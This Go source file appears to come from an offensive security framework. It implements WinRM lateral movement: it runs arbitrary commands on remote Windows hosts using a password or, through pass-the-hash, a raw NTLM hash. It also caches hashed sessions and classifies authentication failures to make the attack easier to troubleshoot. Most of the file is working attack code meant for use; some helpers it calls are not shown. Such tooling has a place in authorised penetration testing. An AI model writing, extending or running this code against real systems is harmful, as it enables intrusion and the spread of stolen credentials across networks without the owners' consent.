package lateral

import (
	"bytes"
	"context"
	"fmt"
	"strings"

	pb "github.com/KKingZero/ARK/pkg/pb"
	"github.com/masterzen/winrm"
)

func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Command == "" {
		return nil, fmt.Errorf("command required")
	}
	if cfg.Username == "" {
		return nil, fmt.Errorf("username required for WinRM")
	}
	if cfg.Password == "" && cfg.NtlmHash == "" {
		return nil, fmt.Errorf("password or ntlm_hash required for WinRM")
	}

	// HTTP 5985. Insecure TLS reserved for future HTTPS/5986 fields.
	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)
	user := formatDomainUser(cfg.Domain, cfg.Username)

	var stdout, stderr bytes.Buffer
	var exitCode int
	var err error
	if cfg.NtlmHash != "" {
		hashHex, herr := normalizeNTHashHex(cfg.NtlmHash)
		if herr != nil {
			return nil, pthWrap(PTHLayerKeyDerivation, herr)
		}
		exitCode, err = runPTHCommand(ctx, cfg.Target, user, hashHex, endpoint, cfg.Command, &stdout, &stderr)
	} else {
		// Prefer NTLM message encryption (pypsrp encryption=auto parity) when available.
		// Falls back to plain ClientNTLM if encryption setup fails.
		params := *winrm.DefaultParameters
		if enc, encErr := winrm.NewEncryption("ntlm"); encErr == nil {
			params.TransportDecorator = func() winrm.Transporter {
				return enc
			}
		} else {
			params.TransportDecorator = func() winrm.Transporter {
				return &winrm.ClientNTLM{}
			}
		}
		var client *winrm.Client
		client, err = winrm.NewClientWithParameters(endpoint, user, cfg.Password, &params)
		if err != nil {
			return nil, fmt.Errorf("create WinRM client: %w", classifyWinRMError(err, false, user))
		}
		exitCode, err = client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
	}
	if err != nil {
		return nil, fmt.Errorf("WinRM exec: %w", classifyWinRMError(err, cfg.NtlmHash != "", user))
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR:\n" + stderr.String()
	}

	return &pb.LateralMoveResult{
		Method:  "winrm",
		Target:  cfg.Target,
		Success: exitCode == 0,
		Output:  output,
	}, nil
}

func runPTHCommand(ctx context.Context, target, user, hashHex string, endpoint *winrm.Endpoint, command string, stdout, stderr *bytes.Buffer) (int, error) {
	slot := acquirePTHSlot(pthSessionKey(target, user, hashHex))
	slot.mu.Lock()
	defer slot.mu.Unlock()
	if slot.client == nil {
		tpt := newClientNTLMWithHash(user, hashHex)
		params := *winrm.DefaultParameters
		params.TransportDecorator = func() winrm.Transporter { return tpt }
		client, err := winrm.NewClientWithParameters(endpoint, user, "x", &params)
		if err != nil {
			return 0, err
		}
		slot.transport = tpt
		slot.client = client
	}
	return slot.client.RunWithContext(ctx, command, stdout, stderr)
}

// classifyWinRMError tags hash failures with pth_layer= if not already tagged.
func classifyWinRMError(err error, usedHash bool, domainUser string) error {
	if err == nil {
		return nil
	}
	if _, ok := PTHDiagnose(err); ok {
		return err
	}
	msg := err.Error()
	low := strings.ToLower(msg)
	if usedHash {
		switch {
		case strings.Contains(low, "timeout"), strings.Contains(low, "connection refused"),
			strings.Contains(low, "no such host"):
			return pthWrapNet(fmt.Errorf("%w (user=%s)", err, domainUser))
		case strings.Contains(msg, "415"), strings.Contains(low, "multipart"),
			strings.Contains(low, "content-type"):
			return pthWrap(PTHLayerWinRMMIME, fmt.Errorf("%w (user=%s)", err, domainUser))
		case strings.Contains(low, "unseal"), strings.Contains(low, "seal"),
			strings.Contains(low, "encrypt"):
			return pthWrap(PTHLayerSignSeal, fmt.Errorf("%w (user=%s)", err, domainUser))
		case strings.Contains(low, "www-authenticate"), strings.Contains(low, "negotiate"):
			return pthWrap(PTHLayerHTTPNegotiate, fmt.Errorf("%w (user=%s)", err, domainUser))
		case strings.Contains(msg, "401") || strings.Contains(low, "unauthorized"):
			return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("%w (user=%s; PTH: NETBIOS domain + 32-hex NT; one flow, no seal→plain retry)", err, domainUser))
		default:
			return pthWrap(PTHLayerNTLMHandshake, fmt.Errorf("%w (user=%s)", err, domainUser))
		}
	}
	if strings.Contains(msg, "401") || strings.Contains(low, "unauthorized") {
		return fmt.Errorf("%w (user=%s; password path uses NTLM message encryption when available)", err, domainUser)
	}
	if strings.Contains(low, "encrypt") || strings.Contains(msg, "415") {
		return fmt.Errorf("%w (WinRM message encryption/content-type issue)", err)
	}
	return err
}
